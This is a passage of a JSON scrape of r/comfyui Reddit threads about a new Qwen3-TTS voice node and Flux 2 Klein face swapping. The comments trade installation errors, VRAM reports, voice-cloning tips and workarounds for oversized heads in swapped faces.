{
  "metadata": {
    "last_updated": "2026-01-26 08:59:58",
    "time_filter": "week",
    "subreddit": "comfyui",
    "total_items": 20,
    "total_comments": 272,
    "file_size_bytes": 315494
  },
  "items": [
    {
      "id": "1qljtix",
      "title": "üéôÔ∏è A New Voice Has Arrived ‚Äî Qwen3-TTS Custom Node for ComfyUI Is Here",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qljtix",
      "author": "Narrow-Particular202",
      "created_utc": "2026-01-24 10:38:44",
      "score": 356,
      "num_comments": 67,
      "upvote_ratio": 0.99,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qljtix/a_new_voice_has_arrived_qwen3tts_custom_node_for/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1erxk1",
          "author": "SubstantialYak6572",
          "text": "Looks interesting but those Huggingface hub files are just annoying with all those extra json files. Hopefully someone will package it into a single safetensors or gguf file so it doesn't clutter the model folder up.",
          "score": 9,
          "created_utc": "2026-01-24 11:31:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f8crl",
              "author": "ANR2ME",
              "text": "GGUF for the 1.7b model https://huggingface.co/mradermacher/Qwen3-1.7B-Multilingual-TTS-GGUF\n\nBut not sure whether this is the same model or not üòÖ since the files were uploaded on September 2025.",
              "score": 8,
              "created_utc": "2026-01-24 13:33:26",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1h4sea",
              "author": "Narrow-Particular202",
              "text": "The model was released just a few days ago, so it‚Äôs still very early.  \nIf it gains traction, GGUF versions will likely show up soon, and we‚Äôll update the node to support them. Stay tuned üôÇ",
              "score": 2,
              "created_utc": "2026-01-24 18:59:00",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gr9mr",
          "author": "Narrow-Particular202",
          "text": "The¬†**Qwen3-TTS**¬†model was just released About 3 days ago. Our new custom node is still a preliminary build and requires time for fine-tuning. Any error logs and bug reports are greatly appreciated as they help us continuously improve it. Thank you again for your support.",
          "score": 8,
          "created_utc": "2026-01-24 18:01:30",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1i5fox",
          "author": "Plenty-Mix9643",
          "text": "Is there an way to change the emotion of the cloned Voice?",
          "score": 8,
          "created_utc": "2026-01-24 21:48:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9n46",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 09:20:38",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1f4cu4",
          "author": "RatioTheRich",
          "text": "cann't isntall requirements.txt because of depedency conflicts with huggingface\\_hub",
          "score": 6,
          "created_utc": "2026-01-24 13:08:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f4l60",
              "author": "RatioTheRich",
              "text": "ERROR: Cannot install -r requirements.txt (line 1), -r requirements.txt (line 11), huggingface\\_hub>=1.3.2 and transformers==4.57.3 because these package versions have conflicting dependencies.\n\n\n\nThe conflict is caused by:\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.3 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.6 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.5 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.4 depends on huggingface-hub<1.0 and >=0.34.0",
              "score": 8,
              "created_utc": "2026-01-24 13:09:32",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1h5ll4",
              "author": "Narrow-Particular202",
              "text": "Thanks for reporting this ‚Äî we‚Äôre always listening to user feedback.  \nWe‚Äôve already updated the requirements to avoid conflicts with existing ComfyUI environments.  \nPlease update to **v1.0.1** and try again.",
              "score": 6,
              "created_utc": "2026-01-24 19:02:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hv802",
          "author": "Patient_Weakness4517",
          "text": "Is it possible to add style impressions to the cloned voice (base model)",
          "score": 6,
          "created_utc": "2026-01-24 21:00:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mvbgp",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 15:48:08",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1favaj",
          "author": "MortgageOutside1468",
          "text": "This guy also made a comfyui node:  \n[https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)\n\nFound it from here:  \n[https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7](https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7)\n\nDon't ask me about the implementation though i haven't checked the node.",
          "score": 3,
          "created_utc": "2026-01-24 13:48:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hawsv",
              "author": "Narrow-Particular202",
              "text": "Haha üòÑ looks like we should start advertising over there too üòä  \nJokes aside, it‚Äôs great to see multiple open-source implementations popping up. Feel free to try both and pick whichever fits your workflow best.",
              "score": 3,
              "created_utc": "2026-01-24 19:25:54",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1j9b4c",
              "author": "phazei",
              "text": "I examined the code from both repos, and DarioFT's implementation is significantly better to fit in the comfyUI ecosystem.",
              "score": 1,
              "created_utc": "2026-01-25 01:11:59",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1q6o1q",
                  "author": "Left_Ad7536",
                  "text": "Entretanto, n√£o consegui instalar a do DarioFT pois pede onnxruntime e eu n√£o tenho isso no reposit√≥rio do Python.",
                  "score": 1,
                  "created_utc": "2026-01-26 00:32:29",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rg3gb",
                  "author": "MortgageOutside1468",
                  "text": "Here is comparison:  \n[https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7](https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7)  \nUsing GPT 5.2",
                  "score": 1,
                  "created_utc": "2026-01-26 04:35:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1it3wl",
          "author": "throwaway510150999",
          "text": "Does Voice Clone mode allow style instructions?",
          "score": 4,
          "created_utc": "2026-01-24 23:46:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1jk4xv",
          "author": "bezbol",
          "text": "Sorry for noob question, anyway to get qwen3 to moan?",
          "score": 4,
          "created_utc": "2026-01-25 02:11:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9st0",
              "author": "ronbere13",
              "text": "![gif](giphy|ydvukZqFGjqBshPw3H)",
              "score": 5,
              "created_utc": "2026-01-25 09:22:03",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1fx0b4",
          "author": "GravitationalGrapple",
          "text": "It‚Äôs going to take a lot for me to move away from IndexTTS2. Voice cloning, emotional control, good cadence‚Ä¶ I just wish I could get the nodes from snicolast to work, the UI it comes with is just okay.\n\nhttps://github.com/snicolast/ComfyUI-IndexTTS2",
          "score": 3,
          "created_utc": "2026-01-24 15:46:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ik017",
          "author": "LanceCampeau",
          "text": "Been playing around with Qwen3 TTS it this afternoon (local)\n\nA few thoughts...  the Voice Design workflow is fantastic, some amazing results so far.\n\nThe Voice Clone function has been pretty \"meh\" so far but I might be doing something wrong.\n\nbut all in all I'd suggest Eleven Labs voice services just got nuked pretty badly (for English at least)",
          "score": 3,
          "created_utc": "2026-01-24 22:59:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iozgo",
              "author": "Snoo20140",
              "text": "Same experience here. TTS voice cloning from a year ago seemed a bit better, but I too might be missing something. As I don't see much in the means of controls.",
              "score": 1,
              "created_utc": "2026-01-24 23:25:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1j3gs3",
                  "author": "LanceCampeau",
                  "text": "I've realized that adding \"reference text\" to the voice clone module really helps. Also, my sample is 20 seconds long. \n\nStarting to get good results now.",
                  "score": 1,
                  "created_utc": "2026-01-25 00:40:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1j8q8x",
          "author": "phazei",
          "text": "Your nodes look great, but unfortunately it doesn't really handle memory management in a ComfyUI type way.  It'll have lots of issues fitting into other workflows.  Should really do your best to implement in a fashion that uses comfyui's built in components and use a loader node so we can handle our own model downloads while only keeping the extra config files in the repo.",
          "score": 3,
          "created_utc": "2026-01-25 01:08:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1eyvev",
          "author": "Nokai77",
          "text": "I think he's missing the ability to inject emotion into a cloned voice... FAILURE",
          "score": 9,
          "created_utc": "2026-01-24 12:28:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hcanr",
              "author": "Narrow-Particular202",
              "text": " Thanks for calling this out, you‚Äôre right.\n\nAt the moment, emotion/style injection only works on CustomVoice / VoiceDesign, while VoiceClone (Base) does not  officially support instruct/emotion control in the current Qwen3‚ÄëTTS public release. We‚Äôre following the upstream updates; if Qwen exposes emotion control for cloning (or 25Hz models add it), we‚Äôll add it as soon as it‚Äôs available.\n\nIf you have a specific example prompt + reference audio where you expect emotion control, feel free to share, it helps  us test and refine.",
              "score": 6,
              "created_utc": "2026-01-24 19:31:58",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lnqgo",
                  "author": "Nokai77",
                  "text": "For me, Vibevoice is still king; the emotion in the lines is the best, it gives it the realism we   \nwant.\n\n\"Don't make me repeat myself. Go to your room, you're grounded!\"",
                  "score": 1,
                  "created_utc": "2026-01-25 11:25:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1g2ihr",
              "author": "ronbere13",
              "text": "you're right",
              "score": 2,
              "created_utc": "2026-01-24 16:11:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1gj7sy",
                  "author": "FaceDeer",
                  "text": "That was missing from the other Qwen3TTS nodes I tried out last night as well, I guess it wasn't in the base code that Qwen put out and is going to take a bit more work to put in?",
                  "score": 1,
                  "created_utc": "2026-01-24 17:26:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fx17l",
          "author": "NoBuy444",
          "text": "Oh yeah !!!  And by 1038lab. Boy, we're spoiled :-D",
          "score": 2,
          "created_utc": "2026-01-24 15:46:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h74pc",
              "author": "Narrow-Particular202",
              "text": "Thanks for your support ‚ù§Ô∏è",
              "score": 2,
              "created_utc": "2026-01-24 19:09:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1glyhx",
          "author": "CheeseWithPizza",
          "text": "Cant you guys keep a single fixed folder for models. i dont want to keep same model multiple times\n\n    You can download models manually and place them into:\n    ComfyUI/models/TTS/Qwen3-TTS/<MODEL_NAME>/\n\nEvery F QwenTTS repo using its own way",
          "score": 2,
          "created_utc": "2026-01-24 17:38:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h9a9a",
              "author": "Narrow-Particular202",
              "text": "Totally understand, having multiple model folders is frustrating.  \nWe hear you, and we‚Äôre planning to support **ComfyUI** `extra_model_paths.yaml` in an upcoming update so you can keep a single, shared model location.\n\nFeedback like this is always welcome. If you have more suggestions or run into issues, feel free to open an issue or feature request on GitHub ‚Äî it really helps us improve the experience.",
              "score": 1,
              "created_utc": "2026-01-24 19:18:46",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1i49nf",
          "author": "Reasonable-Card-2632",
          "text": "Bro what's the maximum text you can generate in one time? \n1. Your gpu. \n2. Total text character? \n3. Time taken. \n\nText to speech",
          "score": 2,
          "created_utc": "2026-01-24 21:42:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1io2xj",
              "author": "iceyed913",
              "text": "I am getting about 20 seconds worth of audio on my rtx 5090. Anything over a few lines of text and it starts munching through vram gradually and spits out 2:43 min long garbage audio. I must be doing something wrong if people are running entire chapters TTA almost in realtime on rtx 5090. Maybe its the comfui setup/dependancies but its saying all requirements are met when i try to reinstall so no idea tbh.",
              "score": 4,
              "created_utc": "2026-01-24 23:20:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ipq9x",
                  "author": "LanceCampeau",
                  "text": "I get identical results (4090)",
                  "score": 1,
                  "created_utc": "2026-01-24 23:28:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1eo44v",
          "author": "Atmey",
          "text": "Would be nice to hear an example or sample",
          "score": 4,
          "created_utc": "2026-01-24 10:57:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1erb7v",
              "author": "Coloniaman",
              "text": "You can use the example on huggingface and use your own text!",
              "score": 7,
              "created_utc": "2026-01-24 11:26:24",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gaace",
          "author": "OtherProfessional433",
          "text": "isn‚Äôt just about...  \nIt‚Äôs about...\n\nCome on, man.",
          "score": 2,
          "created_utc": "2026-01-24 16:46:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1gnded",
              "author": "CheeseWithPizza",
              "text": "forget this.  \nsupport [https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
              "score": 1,
              "created_utc": "2026-01-24 17:44:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1hadmy",
                  "author": "Narrow-Particular202",
                  "text": "All good, this is an open-source ecosystem, and we‚Äôre happy to see more developers working on it.  \nMore implementations usually mean faster improvements for everyone. Feel free to try both projects and use whichever fits your workflow best.",
                  "score": 4,
                  "created_utc": "2026-01-24 19:23:38",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fu3wn",
          "author": "Ecstatic_Sale1739",
          "text": "I can‚Äôt find it in comfyui manager..üò¢üò¢",
          "score": 1,
          "created_utc": "2026-01-24 15:32:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h6umw",
              "author": "Narrow-Particular202",
              "text": "You might find it by searching for \"QwenTTS\" or \"ComfyUI-QwenTTS\", developed by AILab.",
              "score": 1,
              "created_utc": "2026-01-24 19:08:02",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hpy7r",
              "author": "Zueuk",
              "text": "i opened the comfy manager today and found at least 5 nodes that matched QwenTTS... now i'm not sure which one to install üòï",
              "score": 1,
              "created_utc": "2026-01-24 20:34:51",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g6fj8",
          "author": "RazsterOxzine",
          "text": "One more key component for AI world domination, but in a friendly voice you recognize, because it will already know everything about you. Well done. gg wp.",
          "score": 1,
          "created_utc": "2026-01-24 16:29:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gfdh4",
          "author": "mrImTheGod",
          "text": "How does it compare to fish-speach or vibeVoice 7b - i think 1.x B models are way too small to be good",
          "score": 1,
          "created_utc": "2026-01-24 17:09:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1go76i",
              "author": "35point1",
              "text": "The demos on HF were sub par in comparison to vibevoice if you ask me",
              "score": 2,
              "created_utc": "2026-01-24 17:48:19",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hqp6d",
          "author": "Green-Ad-3964",
          "text": "Is \"Italian\" supported? Also, I'd need to convert long text to speech. Is there a convenient way to do so?",
          "score": 1,
          "created_utc": "2026-01-24 20:38:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lgxoa",
              "author": "superacf",
              "text": "Yes, there are many language supported with Qwen3-TTS.",
              "score": 2,
              "created_utc": "2026-01-25 10:25:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1lxr4e",
                  "author": "Green-Ad-3964",
                  "text": "but even if Italian is always included in the list, I can't see the selector for that language...",
                  "score": 1,
                  "created_utc": "2026-01-25 12:45:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ipi3m",
          "author": "iceyed913",
          "text": "I just got this error on my rtx 5090. Sending you a full error log by DM \n\nAILab\\_Qwen3TTSVoiceClone\n\nCUDA error: out of memory  \nSearch for \\`cudaErrorMemoryAllocation' in [https://docs.nvidia.com/cuda/cuda-runtime-api/group\\_\\_CUDART\\_\\_TYPES.html](https://docs.nvidia.com/cuda/cuda-runtime-api/group__CUDART__TYPES.html) for more information.  \nCUDA kernel errors might be asynchronously reported at some other API call, so the stacktrace below might be incorrect.  \nFor debugging consider passing CUDA\\_LAUNCH\\_BLOCKING=1  \nCompile with \\`TORCH\\_USE\\_CUDA\\_DSA\\` to enable device-side assertions.",
          "score": 1,
          "created_utc": "2026-01-24 23:27:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1jkbak",
              "author": "VanessaCarter",
              "text": "Let me know if you figure it out, and if it worked. Maybe it's still in beta or still in the testing phase.",
              "score": 2,
              "created_utc": "2026-01-25 02:12:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1lw5dp",
          "author": "tatamigalaxy_",
          "text": "Did this work for a single person? All the workflows and nodes that I've seen till now have been completely useless. Maybe this one is different...",
          "score": 1,
          "created_utc": "2026-01-25 12:33:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ni98z",
          "author": "renczzz",
          "text": "Pretty nice! It works on amd gpu's too. the only thing is, it got stuck here and there while generating. I had to replace some lines in the code to disable flash attention. generation is slower, but no more errors. Thanks!",
          "score": 1,
          "created_utc": "2026-01-25 17:27:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nwo3t",
          "author": "Forsaken-Truth-697",
          "text": "I can clone professional sounding voices using Chatterbox without any extra complexity.\n\nThanks anyways, maybe i try this later.",
          "score": 1,
          "created_utc": "2026-01-25 18:27:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcapa",
          "author": "EnvironmentalDust229",
          "text": "This is amazing!",
          "score": 1,
          "created_utc": "2026-01-24 13:56:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ffq3r",
          "author": "SnooPuppers4132",
          "text": "thank you",
          "score": 1,
          "created_utc": "2026-01-24 14:16:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1exnaj",
          "author": "Key_Highway_8728",
          "text": "Apparently needs shitloads of vram?  \"If your machine has less than 96GB of RAM...\"",
          "score": 0,
          "created_utc": "2026-01-24 12:19:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f205x",
              "author": "BarGroundbreaking624",
              "text": "Is that for training because I‚Äôve been running it and the 1.7b  models only seem to use half my 24gb VRAM \n\n\nThe clone seems pretty good and voice design too. \nI don‚Äôt know why I always try to do something awkward - you can‚Äôt tell a cloned voice to use emotion in the same was as custom voice so it has to infer it from the spoken words‚Ä¶",
              "score": 8,
              "created_utc": "2026-01-24 12:51:46",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fciyc",
              "author": "raz0099",
              "text": "Or just give it a try with wangp.",
              "score": 3,
              "created_utc": "2026-01-24 13:58:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1f7zfc",
              "author": "aeroumbria",
              "text": "I think that is for manually compiling flash attention if you have like 64GB of RAM but a 9950. In this case you don't have enough RAM to run 16 or 32 threads of compilation, so you have to cap the jobs to a smaller number.",
              "score": 2,
              "created_utc": "2026-01-24 13:31:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qjmzm5",
      "title": "Flux 2 Klein has decent built-in face swapping ability",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qjmzm5",
      "author": "slpreme",
      "created_utc": "2026-01-22 06:20:13",
      "score": 308,
      "num_comments": 62,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qjmzm5/flux_2_klein_has_decent_builtin_face_swapping/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o10akpf",
          "author": "inagy",
          "text": "This model is a real surprise to me. Even the 4B (which is really fast) is good at isolating parts, replacing elements, \"understanding\" controlnet images.",
          "score": 19,
          "created_utc": "2026-01-22 07:19:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13fk77",
              "author": "ChicoTallahassee",
              "text": "Is the 4b base better than 9b distilled?",
              "score": 2,
              "created_utc": "2026-01-22 18:46:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1416zi",
                  "author": "inagy",
                  "text": "**For others reading this comment for the first time**: looks like I was mislead by that [ComfyUI blog](https://blog.comfy.org/p/flux2-klein-4b-fast-local-image-editing), as the 9b distilled model is available here [https://huggingface.co/black-forest-labs/FLUX.2-klein-9B](https://huggingface.co/black-forest-labs/FLUX.2-klein-9B)\n\n\\---\n\nI've only tested the 9b base, because the distilled is API only, and I'm only interested in local models. 9b is more capable of course, it also uses Qwen3 8b instead of 4b, so the prompt understanding is obviously better, because the text encoder is more capable. But it's much slower. At the same time 9b base renders an image with 20 or so steps, I can do 2-3 smaller edits with 4b distilled, multiple edits chained after another or just do quicker edit-generate turns overall. And if you don't overload 4b with too many editing instructions at once, it's pretty capable as I see. 4b seems to struggle with text rendering a bit though.",
                  "score": 0,
                  "created_utc": "2026-01-22 20:24:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o10cgu7",
          "author": "Snoo20140",
          "text": "I tried it already and had issues with lighting mismatching. It doesn't seem to handle low resolution faces or conflicting lighting from my tests. \n\nMaybe it was just my run/prompts/images tho.",
          "score": 8,
          "created_utc": "2026-01-22 07:36:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o10hs9m",
              "author": "slpreme",
              "text": "prompt is still important i barely wrote it in a minute. maybe adding a prompt about the lighting would help",
              "score": 6,
              "created_utc": "2026-01-22 08:24:44",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o10r8ff",
              "author": "Bronzeborg",
              "text": "use the relight template to fix old images first :)",
              "score": 3,
              "created_utc": "2026-01-22 09:54:11",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o16qt1e",
                  "author": "Snoo20140",
                  "text": "That isn't a bad idea. Will give it a go. I appreciate it.",
                  "score": 1,
                  "created_utc": "2026-01-23 05:15:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o134e13",
              "author": "yoomiii",
              "text": "indeed, I had this issue as well",
              "score": 1,
              "created_utc": "2026-01-22 17:57:04",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o11f7ps",
          "author": "D0wly",
          "text": "I found that making an (single) image in photoshop with multiple faces of the reference subject helps a ton.",
          "score": 9,
          "created_utc": "2026-01-22 13:01:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o114p73",
          "author": "huaweio",
          "text": "Playing around with the sigma\\_max values ‚Äã‚Äã(\\~0.95-0.98) yields some interesting results. The main problem I see is the size difference between the heads. It usually makes the head larger than the body. I've tried adding some extra instructions to the prompt, but without success. I don't know if anyone has been able to find a solution.",
          "score": 7,
          "created_utc": "2026-01-22 11:49:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1152dv",
              "author": "slpreme",
              "text": "yeah i really tried but it loves making bobble heads",
              "score": 6,
              "created_utc": "2026-01-22 11:52:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o11kyh2",
                  "author": "huaweio",
                  "text": "Great job anyways!",
                  "score": 1,
                  "created_utc": "2026-01-22 13:34:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o11vjxx",
              "author": "Expicot",
              "text": "So far my best trick is to photoshop the new head over the old one (so human control about the proportions), and make the \"swap\" using the same new face as reference. Works pretty well. Better than all previous checkpoints and edit version I had tried so far (Qwen, Kontext).",
              "score": 4,
              "created_utc": "2026-01-22 14:29:46",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o15ctsr",
                  "author": "slpreme",
                  "text": "hmm maybe i can make a node to do this automatically",
                  "score": 3,
                  "created_utc": "2026-01-23 00:25:17",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "o170l40",
                  "author": "orangeflyingmonkey_",
                  "text": "hey! do you have an example maybe you can share? I am having the same problem.",
                  "score": 1,
                  "created_utc": "2026-01-23 06:29:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o104kxy",
          "author": "Ok-Page5607",
          "text": "this is great! thanks for sharing",
          "score": 4,
          "created_utc": "2026-01-22 06:28:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o104za6",
              "author": "slpreme",
              "text": "of course:)",
              "score": 2,
              "created_utc": "2026-01-22 06:31:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o10hkn5",
          "author": "eidrag",
          "text": "I found that for better headswap you have to make the face straight forward 1st, before swapping",
          "score": 3,
          "created_utc": "2026-01-22 08:22:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o10wh58",
          "author": "diffusion_throwaway",
          "text": "What about facial expressions? I‚Äôve had good luck cloning faces, but what if you want the expression from face 1 applied to face 2? As far as I can tell this isn‚Äôt possible. I hope someone can prove me wrong though.",
          "score": 3,
          "created_utc": "2026-01-22 10:41:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o10qqfb",
          "author": "Ok-Internal9317",
          "text": "Compared to Qwen?",
          "score": 4,
          "created_utc": "2026-01-22 09:49:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1601hi",
              "author": "Swimming_Dragonfly72",
              "text": "Flux klein much much better in face swap than qwen. And faster ~ x6 times.¬†\nBut qwen has absolute domination on anatomy and 3D space understanding.¬†\nThey complement each other perfectly",
              "score": 2,
              "created_utc": "2026-01-23 02:33:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o18gb2l",
                  "author": "Ok-Internal9317",
                  "text": "I'll try it out, good insight!",
                  "score": 1,
                  "created_utc": "2026-01-23 13:28:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o104s24",
          "author": "ton89y2k",
          "text": "9B or 4B  or Both",
          "score": 2,
          "created_utc": "2026-01-22 06:30:09",
          "is_submitter": false,
          "replies": [
            {
              "id": "o104xpu",
              "author": "slpreme",
              "text": "can work with both but 9b is a lot better",
              "score": 3,
              "created_utc": "2026-01-22 06:31:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o10srtl",
          "author": "Mugaluga",
          "text": "I think it's pretty good for faces and portraits, upper bodies and even standing in neutral poses. But not much beyond that.\n\nQwen Image Edit is a better tool IMO. And Qwen-Rapid-AIO is even better (because it's based on Qwen Image Edit) but it's also NSFW.\n\nThey will handle everything Klein will but won't fall apart with anatomy nearly as often.\n\nLet's just be honest here. Klein is not great at anatomy and VERY commonly screws up hands, arms and legs. Not every time, but very often.\n\nAlso I am using the default Klein edit workflow from Comfy but for some reason it doesn't let you choose the output resolution. You can open the subgraph and choose a megapixel value, like 1mp or 2mp but it doesn't let you directly choose your output resolution. Anyone know why? Is this a limitation of Klein editing or just a limitation of the template workflow?\n\nMy Qwen Image Edit WF lets me choose the exact output resolution - I prefer that.",
          "score": 5,
          "created_utc": "2026-01-22 10:08:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o11slx0",
              "author": "mnmtai",
              "text": "You can change resolution like with any other workflow out there. Modify the latent node.",
              "score": 2,
              "created_utc": "2026-01-22 14:14:36",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o11k3g2",
              "author": "bhasi",
              "text": "\"My Qwen Image Edit WF lets me choose the exact output resolution - I prefer that.\"\n\nJust use the same node? Skill issue",
              "score": 4,
              "created_utc": "2026-01-22 13:29:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o14bgfp",
              "author": "Own-Quote-2365",
              "text": "Does the Qwen editor also work with the same model, text encoder, and VAE installation, along with basic CompyNode requirements? And what are the system requirements? When I tried using Klein, I was able to use it with only the basic downloads. It ran quickly and smoothly even with low VRAM.",
              "score": 1,
              "created_utc": "2026-01-22 21:12:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1r1z0t",
              "author": "juandann",
              "text": "really? I often get screwed up anatomy also with qwen image edit",
              "score": 1,
              "created_utc": "2026-01-26 03:11:10",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o12x63q",
          "author": "tempedbyfate",
          "text": "The first image looks like the face was photoshopped onto the image, head looks too big to me and doesn't really fit overall.",
          "score": 2,
          "created_utc": "2026-01-22 17:24:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o12wbyh",
          "author": "msixtwofive",
          "text": "first example is horrible - insanely huge head. The rest are very good.\n\n\nJust tried this with 4b vs 9b and from what I can tell 9b doesn't suffer with the head size issue as much.",
          "score": 1,
          "created_utc": "2026-01-22 17:20:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dlbl",
              "author": "slpreme",
              "text": "true ngl üòÇ",
              "score": 1,
              "created_utc": "2026-01-23 00:29:16",
              "is_submitter": true,
